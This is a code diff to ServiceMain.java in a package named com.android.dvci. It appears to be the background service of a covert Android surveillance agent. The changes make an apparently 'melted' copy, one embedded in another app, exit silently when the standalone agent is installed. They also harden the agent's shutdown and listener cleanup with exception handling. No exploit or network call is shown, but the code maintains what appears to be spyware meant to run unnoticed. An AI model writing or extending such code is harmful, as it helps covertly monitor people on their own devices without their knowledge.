@@ -14,8 +14,11 @@ import com.android.dvci.listener.BAc;
 import com.android.dvci.listener.BC;
 import com.android.dvci.listener.BSm;
 import com.android.dvci.listener.BSt;
+import com.android.dvci.listener.ListenerProcess;
+import com.android.dvci.listener.ListenerStandby;
 import com.android.dvci.listener.WR;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.PackageUtils;
 import com.android.mm.M;
 
 /**
@@ -54,6 +57,15 @@ public class ServiceMain extends Service {
 		        Status.self().makeToast(M.e("RUNNING"));
 	        }
 
+            return;
+        }
+
+        String dvci = M.e("com.android.dvci");
+        String pack = Status.self().getAppContext().getPackageName();
+        if (PackageUtils.isInstalledApk(dvci) && !dvci.equals(pack)) {
+            if (Cfg.DEMO) {
+                Status.self().makeToast(M.e("Melt: silent override"));
+            }
             return;
         }
 
@@ -151,7 +163,14 @@ public class ServiceMain extends Service {
     public void onDestroy() {
         super.onDestroy();
 
-        unregisterReceiver();
+        try {
+            unregisterReceiver();
+        }catch(Exception ex){
+            if (Cfg.DEBUG) {
+                Check.log(ex);
+            }
+        }
+
 
         if (Cfg.DEBUG) {
             Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
@@ -161,7 +180,16 @@ public class ServiceMain extends Service {
             Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
         }
 
-        core.Stop();
+        if(core!=null) {
+            try {
+                core.Stop();
+            }catch(Exception ex){
+                if (Cfg.DEBUG) {
+                    Check.log(ex);
+                }
+            }
+
+        }
         core = null;
     }
 
@@ -205,6 +233,8 @@ public class ServiceMain extends Service {
 			unregisterReceiver(bsm);
 			unregisterReceiver(bc);
 			unregisterReceiver(wr);
+
+            ListenerProcess.self().unregister();
 			listenersRegistered = false;
 		}else{
 			if (Cfg.DEBUG) {
